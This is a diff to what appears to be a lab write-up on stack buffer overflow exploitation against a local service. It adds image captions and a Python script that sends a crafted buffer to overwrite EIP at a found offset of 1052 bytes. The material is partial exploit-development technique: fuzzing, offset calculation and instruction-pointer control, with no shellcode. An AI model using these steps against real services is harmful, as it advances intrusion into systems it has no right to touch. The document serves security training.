@@ -112,7 +112,9 @@ Once the crash was reproduced consistently, a unique cyclic pattern was used to 
 
 This process allowed precise identification of the offset required to reach the instruction pointer, an essential step for understanding the impact of the vulnerability and validating exploitability.
 
-![Pattern Created](images/patternCreate.png)
+![Pattern Created](images/2_patternCreate.png)
+
+_Cyclic Pattern Created_
 
 ```Python
 import socket
@@ -130,26 +132,47 @@ client.close()
 print("-> Pattern was send succesfully, check the EIP in Immunity")
 ```
 
-![Pattern Created](images/eipCapture.png)
+![Pattern Created](images/2_eipCapture.png)
+
+_EIP Captured_
 
 #### Evidence
 
-![Offset Found](images/offsetExact.png)
+![Offset Found](images/2_offsetExact.png)
+
+_Exact Offset Found at 1052_
 
 ---
 
 ### Phase 3: EIP Control Verification
 
-A controlled value was inserted at the identified offset to verify successful control over the program execution flow.
+The calculated offset was validated through controlled testing to confirm that the application's execution flow could be influenced as expected.
 
-#### Objectives
+The objective of this stage was not to execute arbitrary code but rather to verify that the memory analysis performed in previous phases was accurate and reproducible.
 
-- Confirm EIP overwrite.
-- Validate previous calculations.
+```Python
+import socket
+
+TARGET_IP = "127.0.0.1"
+TARGET_PORT = 8888
+
+EXACT_OFFSET = 1052
+
+fuzz = "A" * EXACT_OFFSET
+fuzz += "BBBB"
+fuzz += "C" * 500
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((TARGET_IP, TARGET_PORT))
+client.send(fuzz)
+client.close()
+
+print("-> Fuzz was send succesfully, check the EIP, should be 42424242")
+```
 
 #### Evidence
 
-![EIP Control](images/eip-control.png)
+![EIP Control](images/3_memoryControl.png)
 
 ---
 
